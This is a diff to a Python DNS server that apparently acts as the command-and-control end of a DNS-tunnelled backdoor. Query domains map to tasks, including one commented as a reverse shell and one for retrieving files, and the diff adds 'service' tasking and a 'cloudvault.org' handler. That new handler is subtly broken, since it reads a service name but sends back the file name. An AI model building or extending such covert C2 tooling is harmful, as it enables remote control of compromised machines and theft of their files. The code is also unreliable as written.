@@ -212,6 +212,8 @@ def run(bind_ip=LISTEN_IP, port=53):
                     sendResponseA(sock, data, addr, 232)
                 elif (command == "file"):
                     sendResponseA(sock, data, addr, 85)
+                elif (command == "service"):
+                    sendResponseC(sock, data, addr, 150)
             else:
                 sendResponseA(sock, data, addr, 100)
         elif (domain == "securelogin.com"): #Reverse Shell
@@ -239,6 +241,13 @@ def run(bind_ip=LISTEN_IP, port=53):
         elif (domain == "fileshare.org"): #Get filename
             if(len(contSplit) >= 1):
                 fileName = contSplit[0]
+                del(contSplit[0])
+                sendResponseC(sock, data, addr, fileName)
+            else:
+                sendResponseA(sock, data, addr, 100)
+        elif (domain == "cloudvault.org"): #Get filename
+            if(len(contSplit) >= 1):
+                serviceName = contSplit[0]
                 del(contSplit[0])
                 sendResponseC(sock, data, addr, fileName)
             else:
